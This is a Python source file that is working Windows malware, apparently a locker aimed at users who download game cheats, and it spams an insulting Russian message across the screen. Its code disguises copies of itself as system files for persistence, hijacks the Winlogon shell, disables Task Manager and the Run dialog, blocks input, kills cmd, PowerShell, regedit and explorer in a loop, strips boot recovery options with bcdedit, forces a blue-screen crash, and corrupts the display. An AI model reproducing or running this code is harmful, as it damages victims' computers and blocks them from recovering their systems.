import win32gui
import win32con
import win32api
import win32process
import ctypes
import random
import time
import os
import sys
import subprocess
import threading
import winreg

delay = 0.03
size = 100
intensity = 1
bsod_count = 0

hdc = None
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
psapi = ctypes.windll.psapi

user32.SetProcessDPIAware()

[w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]
[sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]
script_path = os.path.abspath(sys.argv[0])

MESSAGE = "НЕ КАЧАЙ ЧИТЫ НА КС 2 ЛОХ"
FONT_NAME = "Arial"
FONT_SIZE = 24

def create_font(hdc, font_size):
    lf = win32gui.LOGFONT()
    lf.lfHeight = -font_size
    lf.lfWeight = 700
    lf.lfCharSet = win32con.DEFAULT_CHARSET
    lf.lfOutPrecision = win32con.OUT_TT_PRECIS
    lf.lfClipPrecision = win32con.CLIP_DEFAULT_PRECIS
    lf.lfQuality = win32con.ANTIALIASED_QUALITY
    lf.lfPitchAndFamily = win32con.DEFAULT_PITCH
    lf.lfFaceName = FONT_NAME.encode('ascii')
    return win32gui.CreateFontIndirect(lf)

def draw_messages(hdc, count=15):
    old_font = win32gui.SelectObject(hdc, create_font(hdc, random.randint(18, 36)))
    old_color = win32gui.SetTextColor(hdc, win32api.RGB(random.randint(100,255), 0, 0))
    old_bk = win32gui.SetBkMode(hdc, win32con.TRANSPARENT)
    
    for _ in range(count):
        x = random.randint(0, sw - 400)
        y = random.randint(0, sh - 50)
        win32gui.TextOut(hdc, x, y, MESSAGE)
    
    win32gui.SelectObject(hdc, old_font)
    win32gui.SetTextColor(hdc, old_color)
    win32gui.SetBkMode(hdc, old_bk)

def copy_to_startup():
    try:
        startup_path = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
        startup_file = os.path.join(startup_path, "system32update.exe")
        if not os.path.exists(startup_file):
            subprocess.Popen(f'copy "{script_path}" "{startup_file}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

def inject_winlogon():
    try:
        sys32_file = r"C:\Windows\System32\svchost_helper.exe"
        if not os.path.exists(sys32_file):
            subprocess.Popen(f'copy "{script_path}" "{sys32_file}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
        
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, "Shell", 0, winreg.REG_SZ, "explorer.exe,svchost_helper.exe")
        winreg.CloseKey(key)
    except:
        pass

def disable_taskmgr():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, "NoRun", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "NoFind", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass

def block_ctrl_alt_del():
    try:
        user32.BlockInput(True)
    except:
        pass

def kill_processes():
    while True:
        try:
            processes = ["taskmgr.exe", "cmd.exe", "powershell.exe", "regedit.exe", "msconfig.exe", "explorer.exe"]
            for proc in win32process.EnumProcesses():
                try:
                    h_process = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_VM_READ, False, proc)
                    name = win32process.GetModuleFileNameEx(h_process, 0).lower()
                    if any(p in name for p in processes):
                        win32process.TerminateProcess(h_process, 0)
                except:
                    pass
        except:
            pass
        time.sleep(0.5)

def mouse_jail():
    while True:
        try:
            user32.SetCursorPos(0, 0)
            time.sleep(0.08)
        except:
            time.sleep(0.1)

def bsod_trigger():
    global bsod_count, intensity
    bsod_count += 1
    if bsod_count % 3 == 0:
        intensity += 1
        if intensity > 5:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control", 0, winreg.KEY_ALL_ACCESS)
                winreg.SetValueEx(key, "CrashOnCtrlScroll", 0, winreg.REG_DWORD, 1)
                winreg.CloseKey(key)
                user32.keybd_event(win32con.VK_SCROLL, 0, 0, 0)
                user32.keybd_event(win32con.VK_SCROLL, 0, win32con.KEYEVENTF_KEYUP, 0)
            except:
                pass

def anti_recovery():
    try:
        subprocess.Popen("bcdedit /deletevalue {current} safeboot", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.Popen("bcdedit /deletevalue {current} recoveryenabled", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

def system_lockdown():
    try:
        for proc in win32process.EnumProcesses():
            try:
                h_process = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_VM_READ, False, proc)
                name = win32process.GetModuleFileNameEx(h_process, 0).lower()
                if "explorer.exe" in name or "desktop" in name:
                    win32process.TerminateProcess(h_process, 0)
            except:
                pass
    except:
        pass

def message_spam():
    while True:
        try:
            hdc_msg = win32gui.GetDC(0)
            draw_messages(hdc_msg, random.randint(10, 25))
            win32gui.ReleaseDC(0, hdc_msg)
            time.sleep(0.15)
        except:
            time.sleep(0.2)

threading.Thread(target=message_spam, daemon=True).start()
threading.Thread(target=mouse_jail, daemon=True).start()
threading.Thread(target=kill_processes, daemon=True).start()

copy_to_startup()
inject_winlogon()
disable_taskmgr()
block_ctrl_alt_del()
anti_recovery()
system_lockdown()

while True:
    try:
        hdc = win32gui.GetDC(0)
        
        win32gui.StretchBlt(
            hdc,
            int(size / 2),
            int(size / 2),
            max(1, sw - size * intensity),
            max(1, sh - size * intensity),
            hdc,
            0,
            0,
            sw,
            sh,
            win32con.SRCCOPY,
        )

        x = random.randint(0, w)
        win32gui.BitBlt(hdc, x, 5, 20, h, hdc, x, 0, win32con.SRCCOPY)
        
        win32gui.BitBlt(
            hdc, 
            random.randint(0, sw), 
            random.randint(0, sh), 
            random.randint(50, sw), 
            random.randint(50, sh), 
            hdc, 
            random.randint(-100*intensity, 100*intensity), 
            random.randint(-100*intensity, 100*intensity), 
            win32con.NOTSRCERASE
        )
        
        win32gui.BitBlt(
            hdc,
            0,
            0,
            sw,
            sh,
            hdc,
            random.randrange(-intensity*2, intensity*2),
            random.randrange(-intensity*2, intensity*2),
            win32con.NOTSRCCOPY,
        )
        
        win32gui.ReleaseDC(0, hdc)
        
        current_delay = max(0.005, delay / intensity)
        time.sleep(current_delay)
        
        if random.randint(1, 50) < intensity:
            bsod_trigger()
            
    except:
        time.sleep(0.05)